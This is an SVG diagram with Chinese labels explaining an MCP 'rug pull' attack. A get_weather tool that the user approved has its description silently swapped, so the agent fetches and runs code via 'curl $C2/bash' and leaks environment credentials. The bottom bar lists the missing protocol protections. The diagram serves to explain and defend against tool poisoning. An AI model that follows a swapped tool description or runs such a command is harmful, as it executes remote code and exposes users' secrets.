<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 660 340" style="background:#faf8f5;font-family:system-ui,-apple-system,'Segoe UI',Roboto,sans-serif">
  <defs>
    <filter id="shadow" x="-2%" y="-2%" width="104%" height="108%">
      <feDropShadow dx="0" dy="1" stdDeviation="2" flood-color="#292524" flood-opacity="0.04"/>
    </filter>
    <marker id="ar" viewBox="0 0 10 6" refX="10" refY="3" markerWidth="7" markerHeight="4.5" orient="auto">
      <path d="M0,0 L10,3 L0,6 Z" fill="#d97706"/>
    </marker>
    <marker id="ar-down" viewBox="0 0 6 10" refX="3" refY="10" markerWidth="4" markerHeight="7" orient="auto">
      <path d="M0,0 L3,10 L6,0 Z" fill="#d97706"/>
    </marker>
  </defs>

  <text x="330" y="26" text-anchor="middle" font-size="15" font-weight="700" fill="#292524">MCP Rug Pull：审批与调用之间没有屏障</text>

  <!-- Panel headers -->
  <rect x="20" y="46" width="295" height="28" rx="5" fill="#f5f5f4" stroke="#e8e4de" stroke-width="0.8"/>
  <text x="167" y="65" text-anchor="middle" font-size="11" font-weight="600" fill="#78716c">用户批准时看到的内容</text>

  <rect x="345" y="46" width="295" height="28" rx="5" fill="#f5f5f4" stroke="#e8e4de" stroke-width="0.8"/>
  <text x="492" y="65" text-anchor="middle" font-size="11" font-weight="600" fill="#78716c">Agent 实际执行的内容</text>

  <!-- Divider line with time labels -->
  <line x1="322" y1="46" x2="322" y2="280" stroke="#e8e4de" stroke-width="1" stroke-dasharray="3,2"/>
  <text x="322" y="113" text-anchor="middle" font-size="10" font-weight="600" fill="#a8a29e">T1</text>
  <text x="322" y="173" text-anchor="middle" font-size="10" font-weight="600" fill="#a8a29e">T2</text>
  <text x="322" y="233" text-anchor="middle" font-size="10" font-weight="600" fill="#a8a29e">T3</text>

  <!-- Time arrow -->
  <line x1="322" y1="80" x2="322" y2="270" stroke="#d97706" stroke-width="1"/>
  <line x1="322" y1="270" x2="322" y2="278" stroke="#d97706" stroke-width="1" marker-end="url(#ar-down)"/>

  <!-- ===== LEFT PANEL: User's view ===== -->
  <!-- T1 left -->
  <rect x="24" y="92" width="289" height="42" rx="5" fill="#ffffff" stroke="#e8e4de" stroke-width="0.8" filter="url(#shadow)"/>
  <rect x="24" y="92" width="3" height="42" rx="2" fill="#78716c"/>
  <text x="38" y="110" font-size="11" font-weight="500" fill="#292524">get_weather</text>
  <text x="38" y="124" font-size="9" fill="#78716c">获取天气信息 · 参数 city（string）</text>
  <text x="298" y="117" text-anchor="end" font-size="12" fill="#a8a29e">✓</text>

  <!-- T2 left -->
  <rect x="24" y="152" width="289" height="42" rx="5" fill="#ffffff" stroke="#e8e4de" stroke-width="0.8" filter="url(#shadow)"/>
  <rect x="24" y="152" width="3" height="42" rx="2" fill="#78716c"/>
  <text x="38" y="170" font-size="11" font-weight="500" fill="#292524">get_weather</text>
  <text x="38" y="184" font-size="9" fill="#78716c">获取天气信息 · 参数 city（string）</text>
  <text x="298" y="177" text-anchor="end" font-size="12" fill="#a8a29e">✓</text>

  <!-- T3 left -->
  <rect x="24" y="212" width="289" height="42" rx="5" fill="#f5f5f4" stroke="#e8e4de" stroke-width="0.8" filter="url(#shadow)"/>
  <rect x="24" y="212" width="3" height="42" rx="2" fill="#e8e4de"/>
  <text x="38" y="230" font-size="11" font-weight="500" fill="#a8a29e">get_weather</text>
  <text x="38" y="244" font-size="9" fill="#a8a29e">用户无感知 · 认为一切正常</text>

  <!-- ===== RIGHT PANEL: Actual execution ===== -->
  <!-- T1 right -->
  <rect x="347" y="92" width="289" height="42" rx="5" fill="#ffffff" stroke="#e8e4de" stroke-width="0.8" filter="url(#shadow)"/>
  <rect x="347" y="92" width="3" height="42" rx="2" fill="#78716c"/>
  <text x="361" y="110" font-size="11" font-weight="500" fill="#292524">get_weather</text>
  <text x="361" y="124" font-size="9" fill="#78716c">获取天气信息 · 参数 city（string）</text>
  <text x="621" y="117" text-anchor="end" font-size="12" fill="#a8a29e">✓</text>

  <!-- T2 right ✗ TOOL REPLACED -->
  <rect x="347" y="152" width="289" height="42" rx="5" fill="#ffffff" stroke="#d97706" stroke-width="1" filter="url(#shadow)"/>
  <rect x="347" y="152" width="3" height="42" rx="2" fill="#d97706"/>
  <text x="361" y="170" font-size="11" font-weight="500" fill="#292524">get_weather</text>
  <text x="361" y="184" font-size="9" fill="#d97706">curl $C2/bash · 描述已被静默替换</text>
  <text x="621" y="177" text-anchor="end" font-size="12" fill="#d97706">✗</text>

  <!-- T3 right ATTACK -->
  <rect x="347" y="212" width="289" height="42" rx="5" fill="#ffffff" stroke="#d97706" stroke-width="1" filter="url(#shadow)"/>
  <rect x="347" y="212" width="3" height="42" rx="2" fill="#d97706"/>
  <text x="361" y="230" font-size="11" font-weight="500" fill="#d97706">Agent 执行恶意指令</text>
  <text x="361" y="244" font-size="9" fill="#78716c">读取环境变量 · 外泄凭证</text>

  <!-- Bottom annotation bar -->
  <rect x="20" y="278" width="620" height="26" rx="5" fill="#ffffff" stroke="#e8e4de" stroke-width="0.8"/>
  <rect x="20" y="278" width="620" height="26" rx="5" fill="#fef3c7" opacity="0.35"/>
  <text x="330" y="295" text-anchor="middle" font-size="10" fill="#78716c">
    <tspan fill="#d97706" font-weight="600">MCP 协议缺失：</tspan>
    <tspan>无版本钉住 · 无内容哈希 · 无审批快照</tspan>
  </text>
</svg>